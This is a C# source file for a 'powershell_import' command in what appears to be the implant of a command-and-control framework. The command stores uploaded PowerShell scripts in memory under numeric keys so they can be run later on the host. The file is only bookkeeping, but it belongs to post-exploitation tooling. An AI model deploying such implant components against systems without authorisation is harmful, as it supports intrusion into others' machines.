using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using Engineer.Models;

namespace Engineer.Commands
{
    internal class PowershellImport: EngineerCommand
    {
        public override string Name => "powershell_import";
        public static string imported = "";
        public static Dictionary<int, string> ImportedScripts = new Dictionary<int, string>();
        public static Dictionary<int, string> ImportedScriptsTracking = new Dictionary<int, string>();

        public override string Execute(EngineerTask task)
        {

            //get the script name from the argument /import but the name is the info after the \ in the file path
            if (task.Arguments.TryGetValue("/import", out string scriptName))
            {
                scriptName = task.Arguments["/import"].Split('\\').Last();
            }

            //if task.arguments contains a /remove switch, remove the script based in the int value equaling the scripts key
            if (task.Arguments.TryGetValue("/remove",out string removeInt))
            {
                int scriptToRemove = int.Parse(removeInt);
                //remove the script from the dictionary
                ImportedScripts.Remove(scriptToRemove);
                //remove the script from the tracking dictionary
                ImportedScriptsTracking.Remove(scriptToRemove);
                //return the success message
                return $"[+] Script {scriptToRemove} removed from the imported scripts list";
            }

            if (task.File.Length < 1)
            {
                Console.WriteLine(task.File.Length);
                return " Error: File not specified";
            }
            var script = Encoding.UTF8.GetString(task.File);
            //if ImportedScripts dictionary is empty, add the script to the dictionary with a key of 1, if it is not check if it holds the script, if it does return the key, if it does not add it to the dictionary and return the key
            if (ImportedScripts.Count == 0)
            {
                ImportedScripts.Add(1, script);
                ImportedScriptsTracking.Add(1, scriptName);
                return "Script Imported";
            }
            else
            {
                if (ImportedScripts.ContainsValue(script))
                {
                    return "script already imported, if u want to reimport, use the remove option and then re add it";
                }
                else
                {
                    var key = ImportedScripts.Keys.Max() + 1;
                    ImportedScripts.Add(key, script);
                    ImportedScriptsTracking.Add(key, scriptName);
                    return "Script Imported";
                }
            }
        }
    }
}
